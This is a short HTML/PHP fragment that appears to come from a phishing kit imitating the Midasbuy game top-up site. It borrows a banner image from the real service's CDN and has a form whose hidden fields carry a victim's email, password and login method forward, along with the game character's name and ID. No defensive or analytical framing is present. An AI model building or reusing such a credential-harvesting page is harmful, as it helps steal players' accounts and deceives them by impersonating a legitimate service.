			...
			<div class="swiper-container" style="height: auto;overflow: visible;">
				<div class="swiper-wrapper swiper-wrapper1">
					<div class="swiper-slide">
						<a class="banner-link">
						<div class="img-box">
							<img class="banner-pic" src="https://cdn.midasbuy.com/images/s17%E8%B5%9B%E5%AD%A3%E5%8D%A1%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89%281%29_meitu_185f8089f.jpg" alt="img" cr="banner"/>
						</div>
						</a>
					</div>
				</div>
		...
		<div class="content">
                <div class="x-main" style="padding: 10px;">
                    <div class="tab-nav-box">
						...
						<input type="hidden" name="miil" value="<?=$email; ?>" readonly>
						<input type="hidden" name="pw" value="<?=$password; ?>" readonly>
						<input type="hidden" name="log" value="<?=$login; ?>" readonly>
						<input type="text"  name="nick" value="<?php echo $nick; ?>" placeholder="Character Name" autocomplete="off" readonly>
						<input type="number" name="playid" value="<?php echo $playid; ?>" placeholder="Character ID" autocomplete="off" readonly>
